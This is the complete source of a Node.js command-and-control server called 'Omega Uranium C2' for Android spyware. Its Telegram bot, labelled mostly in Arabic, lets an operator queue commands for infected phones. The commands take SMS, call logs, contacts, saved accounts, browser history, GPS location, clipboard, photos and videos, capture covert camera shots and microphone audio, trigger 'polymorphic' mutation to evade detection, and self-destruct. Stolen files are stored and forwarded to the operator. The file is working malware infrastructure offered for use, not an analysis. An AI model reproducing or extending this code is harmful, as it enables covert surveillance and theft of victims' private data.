require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const TOKEN = process.env.TG_TOKEN;
const CHAT_ID = process.env.TG_ID;

if (!TOKEN || !CHAT_ID) {
    console.error('[-] Missing env: TG_TOKEN, TG_ID');
    process.exit(1);
}

const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
fs.mkdirSync(STORAGE_DIR, { recursive: true });

const db = new sqlite3.Database('./uranium_core_v20.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, android_sdk INTEGER, last_seen INTEGER, online INTEGER DEFAULT 0)`);
    db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT DEFAULT 'PENDING', created_at INTEGER, sent_at INTEGER)`);
});

const app = express();
const appBot = new telegramBot(TOKEN, { polling: true });
app.use(express.json({ limit: '100mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '200mb' }));

async function sendTg(msg, options = {}) {
    try { return await appBot.sendMessage(CHAT_ID, msg, { parse_mode: 'HTML', ...options }); }
    catch (e) { console.error('TG:', e.message); }
}

function escapeHtml(s) {
    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

app.get('/', (req, res) => {
    res.send(`<html><body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:80px;"><h1>[☢️] OMEGA URANIUM C2 v21.0 — Active [☢️]</h1></body></html>`);
});

app.post('/api/v3/uranium/stream', (req, res) => {
    const nodeId = req.headers['x-node-id'] || 'unknown';
    const nodeModel = req.headers['x-node-model'] || 'Unknown';
    const sdk = parseInt(req.headers['x-android-sdk'] || '0');

    db.run(`INSERT INTO nodes (id, model, android_sdk, last_seen, online) VALUES (?,?,?,?,1)
        ON CONFLICT(id) DO UPDATE SET model=excluded.model, android_sdk=excluded.android_sdk, last_seen=excluded.last_seen, online=1`,
        [nodeId, nodeModel, sdk, Date.now()]);

    let payload;
    try { payload = req.body; }
    catch { return res.status(400).json({ status: 'BAD_PAYLOAD' }); }

    if (payload.type === 'TEXT_REPORT') {
        const text = (payload.data || '').substring(0, 3800);
        if (text.length > 2) sendTg(`☢️ <b>[${escapeHtml(nodeId)} | ${escapeHtml(nodeModel)}]</b>\n<pre>${escapeHtml(text)}</pre>`);
        return res.json({ status: 'ACK', task: null });
    }

    if (payload.type === 'TASK_RESULT') {
        db.run(`UPDATE tasks SET status='DONE' WHERE id=?`, [payload.taskId]);
        return res.json({ status: 'ACK', task: null });
    }

    db.get(`SELECT * FROM tasks WHERE node_id=? AND status='PENDING' ORDER BY id ASC LIMIT 1`, [nodeId], (err, row) => {
        if (!row) return res.json({ status: 'ACK', task: null });
        db.run(`UPDATE tasks SET status='SENT', sent_at=? WHERE id=?`, [Date.now(), row.id]);
        const taskResp = { status: 'ACK', task: { id: row.id, action: row.action, payload: JSON.parse(row.payload || '{}') } };
        res.json(taskResp);
    });
});

app.post('/api/v3/uranium/upload_raw', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const nodeModel = req.headers['x-node-model'] || 'Unknown';
        const fileName = path.basename(req.headers['x-file-name'] || `dump_${Date.now()}.bin`);
        if (!Buffer.isBuffer(req.body)) return res.status(400).json({ error: 'BAD_BINARY' });
        if (req.body.length > 80 * 1024 * 1024) return res.status(413).json({ error: 'TOO_LARGE' });

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);

        const saveDir = path.join(STORAGE_DIR, path.basename(nodeId));
        fs.mkdirSync(saveDir, { recursive: true });
        const finalPath = path.join(saveDir, `${Date.now()}_${fileName}`);
        fs.writeFileSync(finalPath, req.body);

        const mb = (req.body.length / 1024 / 1024).toFixed(2);
        await sendTg(`☢️ <b>ملف أسطوري مسحوب: ${escapeHtml(fileName)}</b> (${mb}MB) من <code>${nodeId}</code>`);
        try {
            if (req.body.length <= 48 * 1024 * 1024) {
                await appBot.sendDocument(CHAT_ID, finalPath, { caption: `${fileName} (${mb}MB)` });
            }
        } catch (_) {}
        res.json({ status: 'OK' });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

appBot.on('polling_error', () => {});
appBot.on('error', (e) => console.error('BOT:', e.message));

appBot.on('message', async (msg) => {
    if (String(msg.chat.id) !== String(CHAT_ID)) return;
    const text = msg.text || '';

    if (text === '/start' || text === '/menu') {
        db.all(`SELECT * FROM nodes ORDER BY last_seen DESC LIMIT 15`, async (err, rows) => {
            if (!rows || !rows.length) return sendTg('⚠️ لا نودات نشطة حالياً.');
            const kb = rows.map(n => [{ text: `${n.online ? '🟢' : '⚫'} ${n.model} (${n.id.substring(0,8)})`, callback_data: `menu_${n.id}` }]);
            await sendTg('☢️ <b>لوحة قيادة الأسطورة — اختر النود:</b>', { reply_markup: { inline_keyboard: kb } });
        });
    }
});

appBot.on('callback_query', async (query) => {
    if (String(query.from.id) !== String(CHAT_ID)) return;
    const data = query.data;
    const msg = query.message;

    if (data.startsWith('menu_')) {
        const nodeId = data.replace('menu_', '');
        const kb = { inline_keyboard: [
            [{ text: '🔦 فلاش ON', callback_data: `cmd_CMD_FLASH_ON_${nodeId}` }, { text: '🔦 فلاش OFF', callback_data: `cmd_CMD_FLASH_OFF_${nodeId}` }],
            [{ text: '📳 اهتزاز', callback_data: `cmd_CMD_VIBRATE_${nodeId}` }, { text: '🔊 تنبيه', callback_data: `cmd_CMD_BEEP_${nodeId}` }],
            [{ text: '📸 صورة خلفية', callback_data: `cmd_EXTRACT_CAMERA_SNAP_${nodeId}` }, { text: '🤳 صورة أمامية', callback_data: `cmd_EXTRACT_CAMERA_SNAP_FRONT_${nodeId}` }],
            [{ text: '🎙️ تنصت 10s', callback_data: `cmd_MIC_AI_LISTEN_${nodeId}` }, { text: '👁️ لقطة خاطفة', callback_data: `cmd_MICRO_BURST_SNAP_${nodeId}` }],
            [{ text: '📨 سحب كل الـ SMS (Zip)', callback_data: `cmd_EXTRACT_SMS_${nodeId}` }, { text: '📞 سحب المكالمات (Zip)', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }],
            [{ text: '📇 سحب جهات الاتصال (Zip)', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` }, { text: '📱 التطبيقات المثبتة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }],
            [{ text: '📍 موقع GPS الدقيق', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` }, { text: '📋 الحافظة الحالية', callback_data: `cmd_EXTRACT_CLIPBOARD_${nodeId}` }],
            [{ text: '🖼️ سحب 100 صورة', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }, { text: '📥 سحب 30 فيديو', callback_data: `cmd_EXTRACT_VIDEOS_${nodeId}` }],
            [{ text: '📁 ضغط وتحميل DCIM', callback_data: `cmd_PROC_DCIM_${nodeId}` }, { text: '📥 ضغط وتحميل Download', callback_data: `cmd_PROC_DOWNLOAD_${nodeId}` }],
            [{ text: '📊 فحص التخزين', callback_data: `cmd_STORAGE_AUDIT_${nodeId}` }, { text: '📶 نظام Wi-Fi', callback_data: `cmd_WIFI_AUTOPILOT_${nodeId}` }],
            [{ text: '🔑 الحسابات المحفوظة', callback_data: `cmd_EXTRACT_ACCOUNTS_${nodeId}` }, { text: '🌐 سجل المتصفح', callback_data: `cmd_EXTRACT_BROWSER_${nodeId}` }],
            [{ text: '🔓 إيقاظ الشاشة', callback_data: `cmd_CMD_SCREEN_ON_${nodeId}` }, { text: '🔒 قفل الشاشة', callback_data: `cmd_CMD_SCREEN_OFF_${nodeId}` }],
            [{ text: '🛡️ طفرة التمويه (Polymorphic)', callback_data: `cmd_POLY_MUTATE_${nodeId}` }],
            [{ text: '💥 تدمير ذاتي (Self Destruct)', callback_data: `confirm_SELF_${nodeId}` }],
            [{ text: '🔙 رجوع للقائمة', callback_data: `back_home` }]
        ] };
        await appBot.editMessageText(`🎯 <b>التحكم بالنود الأسطوري:</b> <code>${nodeId}</code>`, {
            chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML', reply_markup: kb
        });
    }
    else if (data.startsWith('confirm_SELF_')) {
        const nodeId = data.replace('confirm_SELF_', '');
        await appBot.editMessageText(`⚠️ <b>تأكيد النسف والتدمير الشامل للنود</b> <code>${nodeId}</code>؟`, {
            chat_id: msg.chat.id, message_id: msg.message_id, parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[
                { text: '✅ نعم، دمر كل شيء', callback_data: `cmd_SELF_DESTRUCT_${nodeId}` },
                { text: '❌ إلغاء التدمير', callback_data: `menu_${nodeId}` }
            ]] }
        });
    }
    else if (data.startsWith('cmd_')) {
        const parts = data.split('_');
        const targetNodeId = parts.pop();
        const action = parts.slice(1).join('_');
        db.run(`INSERT INTO tasks (node_id, action, payload, status, created_at) VALUES (?, ?, '{}', 'PENDING', ?)`,
            [targetNodeId, action, Date.now()], async () => {
                await appBot.answerCallbackQuery(query.id, { text: `☢️ تنفيذ أمر: ${action}` });
            });
    }
    else if (data === 'back_home') {
        await appBot.deleteMessage(msg.chat.id, msg.message_id).catch(() => {});
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[+] Omega Uranium C2 Server active on :${PORT}`));
